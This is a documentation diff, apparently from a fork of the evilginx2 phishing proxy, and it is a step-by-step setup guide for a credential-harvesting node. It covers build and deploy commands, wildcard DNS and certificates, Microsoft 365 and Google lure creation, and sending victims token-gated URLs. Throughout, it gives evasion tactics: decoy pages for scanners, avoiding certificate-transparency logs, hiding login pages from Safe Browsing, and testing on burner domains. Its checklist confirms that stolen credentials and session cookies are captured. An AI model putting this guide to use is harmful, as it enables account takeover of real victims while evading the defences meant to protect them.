@@ -5,111 +5,107 @@ title: Getting started
 
 # Getting started
 
-Shortest path from a clean VPS to a working phishing node. This guide assumes an
-internet-facing Ubuntu VPS, a domain on Cloudflare, and an authorized engagement.
+From a clean Ubuntu VPS to a working node in 5 steps. Placeholders: `<BASE>.<ZONE>`
+(your base domain), `<VPS_IP>` (the node), `<NODE>` (`user@<VPS_IP>`).
 
-> 🔒 **OPSEC**: real hostnames, IPs and lure URLs belong in internal docs only — never in
-> this repository. Everything below uses placeholders: `<BASE>.<ZONE>` for the base domain,
-> `<VPS_IP>` for the node.
+> 🔒 Real hostnames, IPs and lure URLs stay in internal docs — never in this repo.
 
 ---
 
-## 1. Build
-
-Requirements: Go 1.21+ (the fork uses pure-Go SQLite, no CGO).
+## Step 1 — Build
 
 ```bash
 git clone https://github.com/dn9uy3n/fake-evilginx-pro.git
-cd fake-evilginx-pro
-cd src && go build -o ../evilginx2 . && cd ..
+cd fake-evilginx-pro/src && go build -o ../evilginx2 .
 ```
 
-## 2. DNS (Cloudflare)
+## Step 2 — DNS (Cloudflare)
 
-The node uses one base domain with a wildcard A record (DNS-only) plus a bare record:
+Create two records, both **DNS-only** (grey cloud — the CF proxy breaks MITM TLS):
 
-| Record | Type | Content | Proxy |
-|---|---|---|---|
-| `<BASE>.<ZONE>` | A | `<VPS_IP>` | DNS only |
-| `*.<BASE>.<ZONE>` | A | `<VPS_IP>` | DNS only |
+| Record | Type | Content |
+|---|---|---|
+| `<BASE>.<ZONE>` | A | `<VPS_IP>` |
+| `*.<BASE>.<ZONE>` | A | `<VPS_IP>` |
 
-**Rules learned in the field**
+Both are required: a wildcard `*.base` does **not** match `base` itself.
+Verify both resolve before continuing (negative answers cache for up to 30 min).
 
-- The bare record and the wildcard are **both required**: `*.base` does *not* match `base`
-  itself (RFC-style wildcard semantics), and evilginx builds lure URLs on both.
-- Keep records **DNS-only (grey cloud)** — the Cloudflare proxy breaks the MITM TLS and the
-  client IP seen by evilginx becomes Cloudflare's.
-- After any DNS change, verify the bare host *and* a wildcard subdomain resolve before
-  testing; recursive resolvers cache negative answers for up to the SOA minimum TTL.
-
-## 3. Wildcard certificate (DNS-01, no CT-log noise per host)
+## Step 3 — Wildcard certificate (DNS-01)
 
 ```bash
 cd deploy
 ZONE=<ZONE> VPS_IP=<VPS_IP> ./wildcard-cert-setup.sh
 ```
 
-This issues a Let's Encrypt wildcard cert for `*.<BASE>.<ZONE>` via DNS-01 and installs it
-into the node cert directory. The auto-CA (`hotreload` gate) handles the rest.
+Issues `*.<BASE>.<ZONE>` via Let's Encrypt DNS-01, installs it on the node, turns
+autocert off (per-host certs would leak hostnames into CT logs) and sets up renewal.
+Needs a Cloudflare API token with `Zone.DNS Edit` for the zone.
 
-## 4. Deploy + systemd
+## Step 4 — Deploy + start
 
 ```bash
-# ship the binary, phishlets and service unit to the node
-deploy/deploy.sh <user>@<VPS_IP>
+deploy/deploy.sh <NODE>
 ```
 
-Two services run on the node:
+This installs two services:
 
-| Unit | Purpose |
+| Service | Role |
 |---|---|
-| `evilginx2.service` | the reverse proxy itself, listening `:443` (web) and `:9443` (mTLS API) |
-| `bgrelay.service` | (Google phishlet only) the real-browser relay sidecar on `:9445` — see [google-relay](google-relay.md) |
+| `evilginx2` | reverse proxy `:443` + hidden mTLS API `:9443` |
+| `bgrelay` | Google real-browser relay `:9445` (loopback) — see [google-relay](google-relay) |
 
-Recommended production flags (see `deploy/templates/`):
+Flags that matter (in `deploy/templates/evilginx2.service.tpl`):
 
 ```
--phishlet ms365 -phishlet google -api 9443 \
--botguard -bg-ja4 t13d15,<corporate-proxy-prefix> -bg-trusted 127.0.0.1/32,<VPS_IP>/32
+-botguard -bg-ja4 t13d15 -bg-trusted 127.0.0.1/32,<VPS_IP>/32
 ```
 
-- `-botguard` + `-bg-ja4`: serve a benign decoy to non-allowlisted TLS fingerprints
-  (curl, python-requests, scanners). **This is why raw `curl` gets a 141-byte "It works!"
-  page — that is the anti-bot working, not a fault.** The trusted CIDRs let the node
-  self-test bypass it.
-- Do **not** run `-jsobf ultra` — field-verified to break Microsoft's login JS.
+- `-botguard` serves a benign decoy to non-browser clients (curl, scanners). **A
+  141-byte "It works!" response means it's working — not a fault.**
+- Never add `-jsobf ultra` (breaks Microsoft login JS) or `-debug` in production
+  (leaks plaintext passwords to the journal).
 
-## 5. First lure
+Campaign phishlets go in `<INSTALL_DIR>/phishlets/` on the node — they are
+gitignored by design and never ship with the repo.
 
-1. Put your campaign phishlet YAML into `phishlets/` on the node (files are gitignored by
-   design — they never ship with the repo).
-2. Operate via the console from your workstation: [operations guide](operations.md).
+## Step 5 — First lure
+
+From your workstation (client certs were generated on the node in `~/.evilginx/api/`;
+copy them to `tools/api-certs-vps/` and edit `tools/my-servers.json` — see
+`servers.example.json` for the format):
 
 ```bash
-cd tools
-python egconsole.py
-# inside the console:
-#   phishlets            → list + status
-#   enable ms365         → hot-enable, no restart
-#   lure-create ms365 https://www.office.com
-#   lureurl ms365 8      → generate the campaign URL (host + path)
+cd tools && python egconsole.py
 ```
 
-Send the victim the token-gated URL: `https://<host>/<path>?t=<token>`. Crawlers and link
-previewers that omit the token get a 302 to a benign redirect — Safe Browsing never sees a
-login page to classify.
+```text
+eg> phishlets              # verify your phishlet is enabled
+eg> enable ms365           # hot-enable if needed (no restart)
+eg> lure-create ms365 https://www.office.com
+eg> lureurl ms365 1        # build the URL
+```
 
-## 6. Google phishlet extra steps
+Send victims `https://<host>/<path>?t=<token>` — read the token from `lures` and
+append it yourself (it's a campaign secret). Requests without the token get a
+benign redirect; Safe Browsing never sees a login page to classify.
 
-The Google phishlet needs the relay sidecar (botguard is origin-bound — classic MITM
-cannot work). Deploy `tools/relay/{bgrelay.py,page.html}` per the
-[relay guide](google-relay.md), then create a relay lure (`relay: true`).
+## Verify before the campaign
 
-## 7. Verify before the campaign
+- [ ] Bare + wildcard hosts resolve from an external resolver
+- [ ] curl (plain) → 141-byte decoy = botguard alive
+- [ ] Trusted-loopback render shows the real login flow:
 
-- [ ] Bare and wildcard hosts both resolve (from an external resolver)
-- [ ] `curl` (no UA) → 141-byte decoy = botguard alive
-- [ ] Trusted-loopback render of the lure shows the real login flow
-- [ ] Token-gate: lure without `?t=` redirects to the benign URL
-- [ ] Test account end-to-end: credentials + cookies land in the session store
-- [ ] Chrome Safe Browsing check on a burner domain, not the campaign one
+```bash
+ssh <NODE> 'curl -sk -A "<browser UA>" -L -c /tmp/cj \
+  --resolve <host>:443:127.0.0.1 "https://<host>/<path>?t=<token>" -o /dev/null -w "%{http_code} %{size_download}\n"'
+```
+
+- [ ] Test account end-to-end: credentials + cookies land in `sessions`
+- [ ] Safe Browsing check on a **burner** domain, never the campaign one
+
+## Next
+
+- [Operations guide](operations) — day-2 workflows, the full egconsole reference
+- [Google relay](google-relay) — extra setup for the Google phishlet
+- [Architecture](architecture) — how it all fits together
